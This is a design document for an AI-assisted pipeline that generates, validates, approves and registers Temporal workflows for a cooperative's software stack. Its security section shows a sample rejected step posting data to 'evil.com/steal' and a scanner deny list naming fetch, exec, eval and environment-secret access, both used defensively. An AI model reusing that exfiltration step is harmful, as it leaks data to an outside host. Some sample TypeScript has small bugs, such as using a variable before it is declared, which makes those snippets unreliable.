
# AI-Assisted, Pathways-Aware Temporal Workflow Generation

**Status: design · 2026-11-20 · meta-workflow specification.**

How does a group create a Temporal workflow that is secure, versioned, idempotent,
and has contingency plans? How does Pathways accountability wrap the generation
process itself?

---

## The Problem

Temporal workflows in the irl.coop stack are currently hand-written TypeScript
files in `apps/coop-api/src/workflows/`. This has four failure modes:

1. **Security:** A developer can write a workflow that calls arbitrary external
   APIs, exfiltrates data, or bypasses RLS. No automated review exists.
2. **Versioning:** Workflow code changes are not tracked against the on-chain
   `CoopRegistry` or the event bus schema. A workflow deployed last week may
   silently break today because the event schema changed.
3. **Idempotency:** A workflow triggered twice (network retry, duplicate event)
   creates duplicate ledger entries, duplicate payments, or duplicate entries.
   Not all workflows use `workflowId` deterministically.
4. **Contingency:** When a workflow fails at step 7 of 12, there is no automated
   rollback, no graceful degradation, and no clear signal to the group that
   something needs manual intervention.

The fix is not "more code review meetings." The fix is a **generative pipeline**
where AI assists in drafting, Pathways enforces accountability, and automated
validators enforce the four dimensions before a workflow is ever registered
with Temporal.

---

## The Generative Pipeline

```
┌─────────────────┐    ┌──────────────────┐    ┌─────────────────┐
├─ User describes  │────│ AI assists:      │────│ Pathways Run:   │
│  desired workflow│    │ draft YAML + TS  │    │  review workflow│
└─────────────────┘    │ + validation plan│    │  spec + approve │
                       └──────────────────┘    └─────────────────┘
                              │                         │
                              ▼                         ▼
                       ┌──────────────────┐    ┌─────────────────┐
                       │ Static validators │    │ Safe threshold  │
                       │ (security, schema)│    │ vote to bless   │
                       └──────────────────┘    └─────────────────┘
                              │                         │
                              ▼                         ▼
                       ┌──────────────────┐    ┌─────────────────┐
                       │ Simulation runner │    │ On-chain        │
                       │ (idempotency test)│    │ registration    │
                       └──────────────────┘    │ in CoopRegistry │
                              │                └─────────────────┘
                              ▼
                       ┌──────────────────┐
                       │ Temporal server  │
                       │ registers workflow│
                       └──────────────────┘
```

---

## 1. The Workflow Spec Format

Every workflow is defined first as a **YAML spec**, not as raw TypeScript. The
spec is the source of truth.

```yaml
# workflows/proposals/annual-membership-renewal.yaml
name: annual-membership-renewal
version: 2.1.0
autonomy: A2               # A1 = human-gated each step, A2 = headless with gate-profile, A3 = peer-voted
owner_group: detroit-soil

# What triggers this workflow
triggers:
  - type: cron
    schedule: "0 0 1 * *"   # First of every month
  - type: event
    event_type: membership.expiring

# What data it needs (schema references)
inputs:
  - name: member_id
    type: uuid
    source: group.members
  - name: renewal_window_days
    type: int
    default: 30

# What it does (high-level steps)
steps:
  - name: fetch-member
    activity: db.query
    query: "SELECT * FROM members WHERE id = ${{inputs.member_id}}"
    output: member
    retry_policy:
      max_attempts: 3
      interval: 10s

  - name: send-reminder
    activity: bus.publish
    event:
      type: membership.reminder
      payload: "${{steps.fetch-member.output}}"
    condition: "${{steps.fetch-member.output.renewal_eligible}}"

  - name: wait-for-response
    activity: workflow.sleep
    duration: "${{inputs.renewal_window_days}}d"
    timeout: "${{inputs.renewal_window_days + 7}}d"

  - name: check-renewal
    activity: db.query
    query: "SELECT renewed_at FROM members WHERE id = ${{inputs.member_id}}"
    output: renewal_status

  - name: escalate-or-suspend
    activity: conditional
    branches:
      - condition: "${{steps.check-renewal.output.renewed_at}} != null"
        steps:
          - name: mark-renewed
            activity: db.update
            table: members
            set: { status: "active" }
      - condition: "${{steps.check-renewal.output.renewed_at}} == null"
        steps:
          - name: mark-lapsed
            activity: db.update
            table: members
            set: { status: "lapsed" }
          - name: notify-board
            activity: bus.publish
            event:
              type: membership.lapsed
              priority: high

# How to identify if this exact work already happened
idempotency:
  key: "membership-renewal:${{inputs.member_id}}:${{trigger.timestamp | date('YYYY-MM')}}"
  scope: group
  collision: abort  # abort, skip, or overwrite

# What happens if the workflow fails
contingency:
  on_failure:
    - notify: "slack://#ops-alerts"
    - log_level: error
    - create_issue: true
  on_timeout:
    - escalate_to: board
    - fallback_action:
        activity: bus.publish
        event: { type: membership.escalation_timeout }
  rollback:
    enabled: true
    activities: [mark-renewed, mark-lapsed]

# Security constraints
security:
  external_api_calls: []   # none allowed
  db_permissions: [read members, update members_status]
  bus_events: [membership.reminder, membership.lapsed, membership.escalation_timeout]
  secrets_access: []       # no secrets needed
  max_execution_time: 35d
```

---

## 2. AI-Assisted Generation

The user describes the workflow in natural language. The AI assistant generates
the YAML spec + TypeScript implementation + test cases.

### 2.1 Input: Natural language prompt

```
"We need a workflow that checks every month if members are up for renewal.
If they are, send them a reminder. Wait 30 days. If they renew, mark them
active. If not, mark them lapsed and tell the board. Don't let this run twice
for the same month. If the member responds during the wait, the workflow
should finish early."
```

### 2.2 Output: Three artifacts

1. **YAML spec** (the contract)
2. **TypeScript workflow** (the implementation)
3. **Test suite** (idempotency + contingency validation)

```typescript
// workflows/generated/annual-membership-renewal.ts
import { workflow, activity, sleep, condition } from "@temporalio/workflow";
import type * as activities from "../activities/membership";

const { queryMember, updateMemberStatus, publishEvent } = workflow.proxyActivities<typeof activities>({
  startToCloseTimeout: "1 minute",
  retry: { maximumAttempts: 3, initialInterval: "10 seconds" },
});

interface RenewalInput {
  member_id: string;
  renewal_window_days: number;
}

export async function annualMembershipRenewal(
  input: RenewalInput
): Promise<void> {
  // Idempotency: Temporal workflowId is pre-hashed from the spec
  // The caller sets: workflowId = `membership-renewal:${member_id}:${YYYY-MM}`

  const member = await queryMember(input.member_id);

  if (member.renewal_eligible) {
    await publishEvent({
      type: "membership.reminder",
      payload: member,
    });
  }

  // Wait for renewal or timeout
  const renewalDeadline = Date.now() + input.renewal_window_days * 86400000;
  const result = await Promise.race([
    sleep(input.renewal_window_days + " days"),
    workflow.condition(() => member.renewed_at !== null, input.renewal_window_days + " days"),
  ]);

  // Re-query to check state
  const current = await queryMember(input.member_id);

  if (current.renewed_at) {
    await updateMemberStatus(input.member_id, "active");
  } else {
    await updateMemberStatus(input.member_id, "lapsed");
    await publishEvent({
      type: "membership.lapsed",
      priority: "high",
    });
  }
}
```

### 2.3 AI generation constraints

The AI is constrained by:
- **Schema registry:** All `activity` names must exist in the registered activity catalog.
- **RLS policies:** DB queries must reference tables the workflow's group has access to.
- **Event bus schema:** All `bus.publish` events must match a known event type.
- **No arbitrary code:** The AI cannot generate `fetch()`, `exec()`, or `eval()`.

---

## 3. Pathways Integration (Accountability)

The workflow spec must be approved through a Pathways run before it is registered.

### 3.1 Pathway template for workflow approval

```yaml
# pathways/templates/approve-workflow.yaml
name: approve-workflow
version: 1.0.0
autonomy: A2
gate_profile:
  require_security_review: true
  require_idempotency_test: true
  max_risk_tier: 2
triggers:
  - type: pr
    repo: irl-coop-stack-v2
    path: workflows/proposals/**
steps:
  - name: lint-spec
    executor: ci-runner
    script: make lint-workflow-spec SPEC=$spec_path

  - name: static-security-scan
    executor: workflow-security-scanner
    script: scan-workflow-spec $spec_path
    outputs:
      - external_api_calls
      - db_permissions
      - secrets_access
      - risk_score

  - name: schema-validation
    executor: schema-validator
    script: validate-workflow-schema $spec_path
    outputs:
      - input_schema_valid
      - event_types_valid
      - activity_catalog_valid

  - name: idempotency-simulation
    executor: temporal-test-runner
    script: make test-workflow-idempotency SPEC=$spec_path
    outputs:
      - double_trigger_safe
      - collision_behavior_verified

  - name: contingency-check
    executor: static-analyzer
    script: make check-contingency SPEC=$spec_path
    outputs:
      - rollback_defined
      - timeout_handler_present
      - fallback_action_present

  - name: steward-review
    executor: safe-vote
    config:
      safe_address: app-stewards.safe.irl.coop
      threshold: 2
      proposal: "Approve workflow ${{spec.name}} v${{spec.version}}"

  - name: register-on-chain
    executor: base-transaction
    script: |
      CoopRegistry.registerWorkflow(
        name=spec.name,
        version=spec.version,
        gitCommit=git_commit,
        riskTier=security_scan.risk_score,
        approvedBy=app_stewards_safe
      )

  - name: register-with-temporal
    executor: temporal-cli
    script: temporal workflow register --spec $spec_path
```

### 3.2 On-chain registration

```solidity
// CoopRegistry.sol
struct WorkflowRegistration {
    bytes20 gitCommit;
    bytes20 approvedBy;
    bytes32 specHash;        // keccak256(yaml spec content)
    uint8 riskTier;          // 1=low, 2=medium, 3=high
    uint256 approvedAt;
    bool revoked;
}
mapping(string => WorkflowRegistration) public workflows;
```

The `specHash` means: if the YAML spec changes even one byte, the on-chain
registration is invalidated. The workflow must be re-approved.

### 3.3 HandoffEnvelope for workflow execution

When a workflow is triggered, the event bus wraps the trigger in a Pathways
`HandoffEnvelope`:

```json
{
  "handoff_type": "temporal_workflow_trigger",
  "workflow_name": "annual-membership-renewal",
  "workflow_version": "2.1.0",
  "workflow_id": "membership-renewal:abc-123:2026-11",
  "trigger": {
    "type": "cron",
    "timestamp": "2026-11-01T00:00:00Z"
  },
  "inputs": {
    "member_id": "abc-123",
    "renewal_window_days": 30
  },
  "safe_signature": "0x...",
  "pathway_run": "pr_0x9a4b..."
}
```

The Temporal worker verifies:
1. The workflow is registered in `CoopRegistry` (not revoked)
2. The `specHash` matches the deployed implementation
3. The `safe_signature` is valid for the triggering group

---

## 4. The Four Validation Dimensions

### 4.1 Security Validation

**Static scanner checks:**

| Check | Method | Fail action |
|---|---|---|
| No arbitrary external APIs | AST parse — deny `fetch`, `axios`, `request` | Reject spec |
| DB permissions match RLS | Compare query tables against `security.db_permissions` | Flag for review |
| No secret exfiltration | Deny `process.env.*` in workflow code | Reject spec |
| Event types are allowlisted | Match `bus.publish` types against registry | Reject spec |
| Max execution time enforced | Check `security.max_execution_time` <= group policy | Cap or reject |
| No privileged activities | Deny `activity: shell.exec`, `activity: fs.write` | Reject spec |

**Example failure:**
```yaml
steps:
  - name: exfil
    activity: http.post        ← REJECTED: external_api_calls is empty but http.post is used
    url: "https://evil.com/steal"
```

### 4.2 Versioning

**Three-layer versioning:**

| Layer | Mechanism |
|---|---|
| **Spec version** | Semantic version in YAML (`version: 2.1.0`) |
| **Git version** | `gitCommit` in `CoopRegistry` registration |
| **Temporal task queue** | Workflows deployed to `group-{group_id}-v{major}` queue |

**Breaking change detection:**
- If input schema changes, a new major version is required.
- If event types change, all downstream consumers must be re-validated.
- The generator compares the new spec against the previous registered version
  and flags breaking changes.

**Example:**
```yaml
# v1.0.0
inputs:
  - name: member_id
    type: uuid

# v2.0.0 (breaking change)
inputs:
  - name: member_id
    type: uuid
  - name: renewal_window_days    ← NEW required input
    type: int
```

The validator flags: "Breaking change: new required input `renewal_window_days`.
Major version bump required. All callers must be updated."

### 4.3 Idempotency

**Idempotency is not optional.** Every workflow must declare an idempotency key.

```yaml
idempotency:
  key: "membership-renewal:${{inputs.member_id}}:${{trigger.timestamp | date('YYYY-MM')}}"
  scope: group
  collision: abort
```

**Validation tests:**

| Test | What it checks |
|---|---|
| Double trigger | Same inputs, same idempotency key — second run must abort/skip |
| Race condition | Two workers receive the same trigger simultaneously — one wins |
| Partial execution | Worker crashes after step 3 — restart must not re-run steps 1-3 |
| Input variation | Same logical work, different input formatting — key must normalize |

**Temporal-native idempotency:**
```typescript
// The workflowId is set to the idempotency key BEFORE execution
const workflowId = `membership-renewal:${member_id}:${yearMonth}`;
await client.start(annualMembershipRenewal, {
  workflowId,
  taskQueue: "detroit-soil-v2",
  args: [input],
});
```

If a workflow with the same `workflowId` already exists, Temporal returns
`WorkflowExecutionAlreadyStartedError`. The caller handles this based on
collision policy (`abort`, `skip`, or `overwrite`).

### 4.4 Contingency Plans

**Every workflow must define:**

```yaml
contingency:
  on_failure:
    - notify: "slack://#ops-alerts"
    - log_level: error
    - create_issue: true
  on_timeout:
    - escalate_to: board
    - fallback_action: { activity: bus.publish, event: { type: escalation.timeout } }
  rollback:
    enabled: true
    max_rollback_steps: 3
```

**Contingency validator checks:**

| Check | Required? |
|---|---|
| `on_failure` handler defined | Yes |
| `on_timeout` handler defined | If workflow has `sleep` or `wait` |
| `rollback.enabled` is `true` for write operations | Strongly recommended |
| Fallback action does not depend on the failed step | Yes |
| Rollback activities are idempotent | Yes |

**Example: rollback after payment failure**

```yaml
steps:
  - name: debit-safe
    activity: safe.debit
    amount: "${{inputs.amount}}"
    output: debit_tx

  - name: send-to-funder
    activity: rail.transfer
    amount: "${{inputs.amount}}"
    tx_ref: "${{steps.debit-safe.output.tx_hash}}"
    retry_policy:
      max_attempts: 3
    on_failure:
      rollback:
        - activity: safe.credit
          amount: "${{inputs.amount}}"
          tx_ref: "${{steps.debit-safe.output.tx_hash}}"
      notify: "slack://#finance-ops"
```

**Temporal sagas for rollback:**
```typescript
// Saga compensations are registered before the action
const saga = new Saga();

saga.addCompensation(safeCredit, {
  amount: input.amount,
  txRef: debitTx.txHash,
});

const debitTx = await safeDebit(input.amount);

saga.addCompensation(railReverse, {
  txRef: debitTx.txHash,
});

try {
  await railTransfer(debitTx.txHash, input.amount);
} catch (err) {
  await saga.compensate();  // Automatically runs compensations in reverse order
  throw err;
}
```

---

## 5. The Complete Lifecycle

| Stage | Actor | Action | Output |
|---|---|---|---|
| 1. Describe | Group member | Writes natural language prompt | Prompt text |
| 2. Generate | AI assistant | Generates YAML + TS + tests | Three artifacts |
| 3. Validate automated | CI pipeline | Static security, schema, idempotency, contingency | Pass/fail report |
| 4. Review | app-stewards Safe | Pathways run with threshold vote | Approval signature |
| 5. Register on-chain | executor | `CoopRegistry.registerWorkflow()` | `specHash` committed |
| 6. Register in Temporal | executor | `temporal workflow register` | Task queue updated |
| 7. Trigger | Event bus / cron | `HandoffEnvelope` sent to Temporal worker | Workflow execution |
| 8. Monitor | Dashboard | Real-time status, rollback alerts, audit trail | Live view |
| 9. Revoke (if needed) | app-stewards Safe | `CoopRegistry.revokeWorkflow()` | All triggers blocked |

---

## 6. Implementation in the Stack

### New directories

```
apps/coop-api/src/workflows/
  proposals/              # YAML specs under review
  generated/              # AI-generated TypeScript (auto-committed)
  activities/             # Reusable activity implementations
  tests/                  # Idempotency + contingency tests
  registry.ts             # On-chain registry client

temporal/
  worker.ts               # Main worker — verifies HandoffEnvelope before execution
  gateways/               # Pathways HandoffEnvelope → Temporal bridge
```

### New CLI commands

```bash
# Generate a workflow from a prompt
npx coop-cli workflow generate --prompt "Check members monthly for renewal..."

# Validate a workflow spec
npx coop-cli workflow validate --spec workflows/proposals/annual-membership-renewal.yaml

# Run idempotency tests
npx coop-cli workflow test-idempotency --spec workflows/proposals/annual-membership-renewal.yaml

# Register an approved workflow
npx coop-cli workflow register --spec workflows/proposals/annual-membership-renewal.yaml --run pr_0xabc...

# Revoke a workflow
npx coop-cli workflow revoke --name annual-membership-renewal
```

---

## 7. Open Questions

1. **Should AI generation be local or remote?** Local (on-device inference) avoids sending group data to an external API, but requires capable hardware. Remote (BYO key) is easier but leaks workflow intent.
2. **How do we version activity implementations?** If `db.query` activity changes its behavior, all workflows using it must be re-validated. Should activities also be registered on-chain?
3. **What is the rollback policy for non-reversible actions?** A blockchain transaction cannot be rolled back. Should the validator flag "non-reversible step — requires A3 autonomy"?
4. **Can groups fork canonical workflows?** A group may want to modify the "annual membership renewal" workflow for their own rules. Is this a self-hosted workflow (no approval needed) or a canonical variant (requires re-approval)?

---

## Summary

| Dimension | How it is enforced |
|---|---|
| **Security** | Static AST scanner + activity allowlist + RLS policy comparison |
| **Versioning** | Semantic versions + git commit + `CoopRegistry.specHash` + Temporal task queue versioning |
| **Idempotency** | Mandatory `idempotency.key` + `workflowId` pre-hashing + double-trigger tests |
| **Contingency** | Mandatory `on_failure`/`on_timeout` handlers + saga compensations + validator checks |
| **Accountability** | Pathways run with Safe threshold vote + on-chain registration + `HandoffEnvelope` signatures |

AI assists in drafting. Pathways enforces governance. Validators enforce
invariants. Temporal executes. The group stays in control.
